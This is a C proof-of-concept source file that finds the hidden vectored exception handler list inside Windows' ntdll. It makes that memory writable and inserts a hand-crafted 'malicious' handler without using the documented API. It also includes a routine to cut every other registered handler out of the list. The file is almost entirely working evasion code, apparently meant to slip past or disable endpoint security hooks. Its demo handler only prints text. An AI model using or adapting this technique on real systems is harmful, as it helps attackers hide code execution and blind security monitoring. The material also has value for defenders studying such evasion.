#include <windows.h>
#include <winternl.h>
#include <stdio.h>

void InjectVEHEntry();
LONG WINAPI benignExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo);
LONG WINAPI maliciousExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo);
BOOL getNtdllSectionVa(PCSTR sectionName, PVOID* sectionVa, DWORD* sectionSz);
BOOL checkIfServer();
PVOID findLdrpVectorHandlerList();

//Get the VA for a section in ntdll
//Taken from here: https://github.com/rad9800/misc/blob/main/bypasses/ClearVeh.c
BOOL getNtdllSectionVa(PCSTR sectionName, PVOID* sectionVa, DWORD* sectionSz)
{
	const LIST_ENTRY* head = &NtCurrentTeb()->ProcessEnvironmentBlock->Ldr->InMemoryOrderModuleList;
	LIST_ENTRY* next = head->Flink;

	while (next != head)
	{
		LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(next, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

		const UNICODE_STRING* basename = (UNICODE_STRING*)((BYTE*)&entry->FullDllName + sizeof(UNICODE_STRING));

		if (_wcsicmp(basename->Buffer, L"ntdll.dll") == 0)
		{
			PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((ULONG_PTR)entry->DllBase + ((PIMAGE_DOS_HEADER)entry->DllBase)->e_lfanew);

			for (int j = 0; j < nt->FileHeader.NumberOfSections; j++) {
				const PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(nt) + (DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * j);

				if (_stricmp(section->Name, sectionName) == 0) {

					*sectionVa = (PVOID)((ULONG_PTR)entry->DllBase + section->VirtualAddress);
					*sectionSz = section->Misc.VirtualSize;

					return TRUE;
				}
			}

		}
		next = next->Flink;
	}
	return FALSE;
}

//VEH Struct definition for Windows 10/11 VEH entry
typedef struct _VECTXCPT_CALLOUT_ENTRY {
	LIST_ENTRY ListEntry;
	PVOID reserved;
	int count;
	PVECTORED_EXCEPTION_HANDLER VectoredHandler;
} VECTXCPT_CALLOUT_ENTRY, * PVECTXCPT_CALLOUT_ENTRY;

//VEH Struct definition for Windows Server VEH entry
typedef struct _VECTXCPT_CALLOUT_ENTRYSERVER {
	LIST_ENTRY ListEntry;
	PVOID reserved;
	PVECTORED_EXCEPTION_HANDLER VectoredHandler;
} VECTXCPT_CALLOUT_ENTRY_SERVER, * PVECTXCPT_CALLOUT_ENTRY_SERVER;


//Copied from ReactOS, add a new item to a double linked list
FORCEINLINE VOID InsertHeadList(_Inout_ PLIST_ENTRY 	ListHead,
	_Inout_ PLIST_ENTRY 	Entry
)
{
	PLIST_ENTRY OldFlink;
	OldFlink = ListHead->Flink;
	Entry->Flink = OldFlink;
	Entry->Blink = ListHead;
	OldFlink->Blink = Entry;
	ListHead->Flink = Entry;
}

//This will set the new entry to just point at the list head, cutting out the rest of the list
FORCEINLINE VOID HijackVEHList(_Inout_ PLIST_ENTRY 	ListHead,
	_Inout_ PLIST_ENTRY 	Entry
)
{
	PLIST_ENTRY OldFlink;
	OldFlink = ListHead->Flink;
	Entry->Flink = ListHead;
	Entry->Blink = ListHead;
	OldFlink->Blink = Entry;
	ListHead->Flink = Entry;
}

//Taken from here and modified: https://github.com/rad9800/misc/blob/main/bypasses/ClearVeh.c
//This function registers a benign VEH handler and uses it to walk through the VEH list
//Once a pointer to NTDLL's .data section is identified, that should be the head of the VEH list
PVOID findLdrpVectorHandlerList()
{
	BOOL found = FALSE;

	// Register a fake handler
	PVOID dummyHandler = AddVectoredExceptionHandler(0, &benignExceptionHandler);

	if (dummyHandler == NULL) {
		printf("[-] Failed to register a dummy handler");
		return NULL;
	}

	PLIST_ENTRY next = ((PLIST_ENTRY)dummyHandler)->Flink;
	PVOID sectionVa;
	DWORD sectionSz;
	// LdrpVectorHandlerList will be found in the .data section of NTDLL.dll
	if (getNtdllSectionVa(".data", &sectionVa, &sectionSz))
	{
		while ((PVOID)next != dummyHandler)
		{
			//Check if our address is in the .data section range
			if ((PVOID)next >= sectionVa && (PVOID)next <= (PVOID*)sectionVa + sectionSz)
			{
				found = TRUE;
				break;
			}

			next = next->Flink;
		}
	}

	// Cleanup
	RemoveVectoredExceptionHandler(dummyHandler);

	return found ? next : NULL;
}

//This is a silly way of doing it but we need to check which struct definition we need to use
//We can check by creating a new VEH and then trying to decode the pointer as if it were a server. If it works, then it's a server. Otherwise, it's a workstation
BOOL checkIfServer() {
	PVOID dummyHandler = AddVectoredExceptionHandler(0, &benignExceptionHandler);
	PVOID decodedPointer = DecodePointer(((PVECTXCPT_CALLOUT_ENTRY_SERVER)dummyHandler)->VectoredHandler);
	if (decodedPointer == &benignExceptionHandler) {
		printf("[+] Looks like this is a Windows Server\n");
		return TRUE;
	}
	else {
		printf("[+] Looks like this is a Windows Workstation\n");
		return FALSE;
	}

	RemoveVectoredExceptionHandler(dummyHandler);
}

//POC handlers return different messages
LONG WINAPI benignExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
	printf("HELLO FROM A BENIGN VEH!\n");
	return EXCEPTION_CONTINUE_EXECUTION;
}

//This is our "malicious" handler to be registered
//This POC will return CONTINUE_SEARCH to demonstrate that it has been properly inserted into the list
//If you want to hijack the list, you need to return EXCEPTION_CONTINUE_EXCEPTION or else the process will crash
LONG WINAPI maliciousExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{	
	printf("HELLO FROM A MALICIOUS VEH!\n");
	return EXCEPTION_CONTINUE_SEARCH;
}

//For POC purposes we'll register an exception handler so that we have an entry in the list
//Then we'll insert our own malicious entry and trigger an exception to show that we've skipped the list
void main() {

	//Add a benign handler and raise an exception to show that there's a VEH we will need to skip over
	AddVectoredExceptionHandler(1, &benignExceptionHandler);
	printf("[+] Added benign handler, triggering exception\n");
	RaiseException(DBG_CONTROL_C, 0, 0, NULL);

    //Now we'll inject our VEH entry into the list
	InjectVEHEntry();
    printf("[+] Triggering exception\n");
	//Trigger an exception to trigger our handler
	RaiseException(DBG_CONTROL_C, 0, 0, NULL);

    //This last print statement helps to show if you crashed the process by not handling an error properly (ie: returning EXCEPTION_CONTINUE_SEARCH without another handler)
	printf("[*] Finished");
	return;

}

//This function will:
//Register (and cleanup) a benign VEH to check if this is a Windows server or workstation
//Register (and cleanup) a benign VEH to identify the head of the VEH list
void InjectVEHEntry() {

	PVOID sectionVa;
	DWORD sectionSz; 
	PLIST_ENTRY next;
	DWORD oldProtect;

	BOOL isServer = checkIfServer();

	PVOID LdrpVectorList = findLdrpVectorHandlerList();

	if (LdrpVectorList != NULL) {
		printf("[*] LdrpVectorList: 0x%p\n", LdrpVectorList);
	}
	else {
		printf("[-] Couldn't find LdrpVectorList!\n");
		return;
	}

    //On Windows 10/11 the VEH list should be in the .mrdata section, on server it will be in the .data section
	getNtdllSectionVa(".mrdata", &sectionVa, &sectionSz);

	if (LdrpVectorList > ((ULONG_PTR)sectionVa) && LdrpVectorList < ((ULONG_PTR)sectionVa + sectionSz)) {
		printf("[*] .mrdata VA: 0x%p Size: %d\n", sectionVa, sectionSz);
	}
	else {
		getNtdllSectionVa(".data", &sectionVa, &sectionSz);
		printf("[*] Appears to be Server 2012, using .data section instead...");
		printf("[*] .data VA: 0x%p Size: %d\n", sectionVa, sectionSz);
	}

	//Set our target section to be READ/WRITE
	VirtualProtect(sectionVa, sectionSz, PAGE_READWRITE, &oldProtect);

	PVOID malHandler = NULL;

    //Since the server/workstation structs are slightly different we'll check at each step
    //Your new handler does need to be allocated on the heap
	if (isServer) {
		malHandler = HeapAlloc(GetProcessHeap(), 0, sizeof(VECTXCPT_CALLOUT_ENTRY_SERVER));
	}
	else {
		malHandler = HeapAlloc(GetProcessHeap(), 0, sizeof(VECTXCPT_CALLOUT_ENTRY));
	}

	if (isServer) {
		((PVECTXCPT_CALLOUT_ENTRY_SERVER)malHandler)->VectoredHandler = EncodePointer(&maliciousExceptionHandler);
	}
	else {
		((PVECTXCPT_CALLOUT_ENTRY)malHandler)->VectoredHandler = EncodePointer(&maliciousExceptionHandler);
	}


	//Need to set a valid pointer for the reserved attribute since it gets incremented
	PVOID reserved = HeapAlloc(GetProcessHeap(), 0, 8);
	if (isServer) {
		((PVECTXCPT_CALLOUT_ENTRY_SERVER)malHandler)->reserved = reserved;
	}
	else
	{
		((PVECTXCPT_CALLOUT_ENTRY)malHandler)->reserved = reserved;
	}

	//Insert our handler into the list
	InsertHeadList(LdrpVectorList, (PLIST_ENTRY)malHandler);

	//Reset our memory protection
	VirtualProtect(sectionVa, sectionSz, oldProtect, &oldProtect);

}
